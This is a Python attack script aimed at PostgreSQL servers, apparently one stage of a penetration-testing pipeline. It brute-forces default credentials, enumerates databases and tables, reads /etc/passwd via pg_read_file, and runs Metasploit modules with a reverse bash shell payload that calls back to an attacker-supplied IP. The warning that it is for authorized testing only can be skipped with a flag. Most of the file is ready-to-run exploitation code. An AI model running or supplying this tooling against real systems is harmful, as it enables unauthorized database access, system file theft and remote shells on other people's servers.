#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
EXPLOIT_JSON = "{target}_postgresql_exploit.json"
EXPLOIT_MD = "{target}_postgresql_exploit.md"

def run_command(cmd: List[str], timeout: int = 300, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), True
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def run_metasploit_exploit(module: str, rhost: str, rport: str, payload: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str]:
    """Run a Metasploit exploit module."""
    msf_cmd = [
        "msfconsole", "-q", "-x",
        f"use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run; exit"
    ]
    output, success = run_command(msf_cmd, timeout=600)
    return success, output

def test_postgresql_connection(target: str, port: str) -> bool:
    """Test PostgreSQL connection."""
    cmd = f"psql -h {target} -p {port} -U postgres -c 'SELECT 1;'"
    output, success = run_command(cmd, timeout=30, shell=True)
    return success and "1" in output

def test_default_credentials(target: str, port: str) -> Tuple[str, str, str]:
    """Test default PostgreSQL credentials."""
    default_creds = [
        ("postgres", "postgres"),
        ("postgres", ""),
        ("admin", "admin"),
        ("root", "root"),
        ("user", "user"),
        ("test", "test")
    ]
    
    for username, password in default_creds:
        if password:
            cmd = f"PGPASSWORD='{password}' psql -h {target} -p {port} -U {username} -c 'SELECT 1;'"
        else:
            cmd = f"psql -h {target} -p {port} -U {username} -c 'SELECT 1;'"
        
        output, success = run_command(cmd, timeout=30, shell=True)
        if success and "1" in output:
            logger.info(f"PostgreSQL login successful: {username}:{password}")
            poc = f"psql -h {target} -p {port} -U {username}"
            return username, password, poc
    
    return None, None, ""

def test_postgresql_enumeration(target: str, port: str, username: str, password: str) -> List[Dict]:
    """Test PostgreSQL enumeration."""
    results = []
    
    # Test database listing
    if password:
        cmd = f"PGPASSWORD='{password}' psql -h {target} -p {port} -U {username} -c '\\l'"
    else:
        cmd = f"psql -h {target} -p {port} -U {username} -c '\\l'"
    
    output, success = run_command(cmd, timeout=60, shell=True)
    if success and output.strip():
        results.append({
            "type": "Database Enumeration",
            "target": f"{target}:{port}",
            "details": "Successfully enumerated databases",
            "poc": cmd
        })
    
    # Test table listing
    if password:
        cmd = f"PGPASSWORD='{password}' psql -h {target} -p {port} -U {username} -c '\\dt'"
    else:
        cmd = f"psql -h {target} -p {port} -U {username} -c '\\dt'"
    
    output, success = run_command(cmd, timeout=60, shell=True)
    if success and output.strip():
        results.append({
            "type": "Table Enumeration",
            "target": f"{target}:{port}",
            "details": "Successfully enumerated tables",
            "poc": cmd
        })
    
    return results

def test_postgresql_vulnerabilities(target: str, port: str, username: str, password: str) -> List[Dict]:
    """Test PostgreSQL vulnerabilities."""
    results = []
    
    # Test for superuser privileges
    if password:
        cmd = f"PGPASSWORD='{password}' psql -h {target} -p {port} -U {username} -c 'SELECT current_user, superuser FROM pg_user WHERE usename = current_user;'"
    else:
        cmd = f"psql -h {target} -p {port} -U {username} -c 'SELECT current_user, superuser FROM pg_user WHERE usename = current_user;'"
    
    output, success = run_command(cmd, timeout=60, shell=True)
    if success and "t" in output.lower():
        results.append({
            "type": "Superuser Privileges",
            "target": f"{target}:{port}",
            "details": "User has superuser privileges",
            "poc": cmd
        })
    
    # Test for file read privileges
    if password:
        cmd = f"PGPASSWORD='{password}' psql -h {target} -p {port} -U {username} -c 'SELECT pg_read_file(\'/etc/passwd\');'"
    else:
        cmd = f"psql -h {target} -p {port} -U {username} -c 'SELECT pg_read_file(\'/etc/passwd\');'"
    
    output, success = run_command(cmd, timeout=60, shell=True)
    if success and "root:" in output:
        results.append({
            "type": "File Read Privileges",
            "target": f"{target}:{port}",
            "details": "User can read system files",
            "poc": cmd
        })
    
    return results

def test_postgresql_metasploit_exploits(target: str, port: str, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Test Metasploit PostgreSQL exploits."""
    results = []
    
    # Common PostgreSQL Metasploit modules
    postgresql_modules = [
        "auxiliary/scanner/postgres/postgres_login",
        "auxiliary/admin/postgres/postgres_sql",
        "exploit/linux/postgres/postgres_payload"
    ]
    
    for module in postgresql_modules:
        logger.info(f"Trying Metasploit module: {module}")
        success, output = run_metasploit_exploit(
            module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port
        )
        if success and "session" in output.lower():
            results.append({
                "type": f"Metasploit {module}",
                "target": f"{target}:{port}",
                "details": f"Successful exploitation with {module}",
                "poc": f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {port}; run'"
            })
    
    return results

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploit report to JSON and Markdown."""
    json_path = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    md_path = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    
    # Save JSON
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploit JSON to {json_path}")
    
    # Save Markdown
    lines = [f"# PostgreSQL Exploit Report for {target}:{port}\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    
    # Filter out non-exploit entries
    actual_exploits = [exp for exp in exploits if 'type' in exp]
    failed_attempts = [exp for exp in exploits if 'failed_attempts' in exp]
    
    for exploit in actual_exploits:
        lines.append(f"## {exploit['type']}\n")
        lines.append(f"- **Target**: {exploit['target']}\n")
        lines.append(f"- **Details**: {exploit['details']}\n")
        lines.append(f"- **PoC**: `{exploit['poc']}`\n\n")
    
    # Add failed attempts section
    if failed_attempts:
        lines.append("## Failed Attempts\n")
        for failed in failed_attempts:
            for attempt in failed.get("failed_attempts", []):
                lines.append(f"- {attempt}\n")
    
    with md_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(lines))
    logger.info(f"Saved exploit Markdown to {md_path}")

def exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Exploit PostgreSQL vulnerabilities to gain access."""
    exploits = []
    failed_attempts = []

    logger.info(f"Starting PostgreSQL exploitation on {target}:{port}")

    # Test PostgreSQL connection
    logger.info("Testing PostgreSQL connection...")
    if not test_postgresql_connection(target, port):
        logger.error("PostgreSQL connection failed. Cannot proceed with exploitation.")
        return exploits

    # Test default credentials
    logger.info("Testing default credentials...")
    username, password, cred_poc = test_default_credentials(target, port)
    if username and password:
        exploits.append({
            "type": "Default Credentials",
            "target": f"{target}:{port}",
            "details": f"Credentials {username}:{password}",
            "poc": cred_poc
        })
        
        # Test enumeration with valid credentials
        logger.info("Testing PostgreSQL enumeration...")
        enum_results = test_postgresql_enumeration(target, port, username, password)
        exploits.extend(enum_results)
        
        # Test vulnerabilities with valid credentials
        logger.info("Testing PostgreSQL vulnerabilities...")
        vuln_results = test_postgresql_vulnerabilities(target, port, username, password)
        exploits.extend(vuln_results)

    # Test Metasploit exploits
    logger.info("Testing Metasploit PostgreSQL exploits...")
    msf_results = test_postgresql_metasploit_exploits(target, port, attacker_ip, attacker_port)
    exploits.extend(msf_results)

    # Test additional Metasploit modules from metadata
    logger.info("Checking additional Metasploit exploits...")
    for mods_key in ["msf_mods", "exploitdb_mods"]:
        if mods_key in metadata and metadata[mods_key] != ["none"]:
            for module in metadata[mods_key]:
                if module != "none" and "postgres" in module.lower():
                    logger.info(f"Trying Metasploit module: {module}")
                    success, output = run_metasploit_exploit(
                        module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port
                    )
                    if success and "session" in output.lower():
                        exploits.append({
                            "type": f"Metasploit {module}",
                            "target": f"{target}:{port}",
                            "details": f"Successful exploitation with {module}",
                            "poc": f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {port}; run'"
                        })
                    else:
                        failed_attempts.append(f"Metasploit module {module} on {target}:{port}")

    # Add failed attempts
    if failed_attempts:
        exploits.append({"failed_attempts": failed_attempts})

    logger.info(f"PostgreSQL exploitation completed. Found {len([e for e in exploits if 'type' in e])} exploits.")
    return exploits

def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the first PostgreSQL metadata file for the target and extract port."""
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_postgresql_*_metadata.json"))
    if not metadata_files:
        logger.error(f"No PostgreSQL metadata files found for {target}.")
        return None, ""
    
    metadata_file = metadata_files[0]
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            data = json.load(f)
        port = data.get("port", "5432")
        logger.info(f"Found metadata file: {metadata_file}")
        logger.info(f"Using port {port} from metadata")
        return metadata_file, port
    except Exception as e:
        logger.error(f"Error reading {metadata_file}: {e}")
        return None, ""

def main():
    """Main function to parse arguments and run exploitation."""
    parser = argparse.ArgumentParser(description="PostgreSQL Exploitation Script")
    parser.add_argument("target", help="Target domain or IP")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--no-confirm", action="store_true", help="Skip user confirmation")
    args = parser.parse_args()

    # Legal warning
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only.")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    # Check dependencies
    logger.info("Checking dependencies...")
    for tool in ["psql", "msfconsole", "python3"]:
        if not shutil.which(tool):
            logger.error(f"{tool} not found. Install it.")
            sys.exit(1)

    # Find metadata file
    metadata_file, port = find_metadata_file(args.target)
    if not metadata_file:
        logger.error("No metadata file found. Run recon.py first.")
        sys.exit(1)

    # Load metadata
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
    except Exception as e:
        logger.error(f"Error loading metadata: {e}")
        sys.exit(1)

    # Run exploitation
    logger.info(f"Starting exploitation for {args.target}:{port}...")
    exploits = exploit_target(metadata, args.target, port, args.attacker_ip, args.attacker_port)

    # Save results
    save_exploit_report(exploits, args.target, port)
    logger.info("Exploitation complete.")

if __name__ == "__main__":
    main() 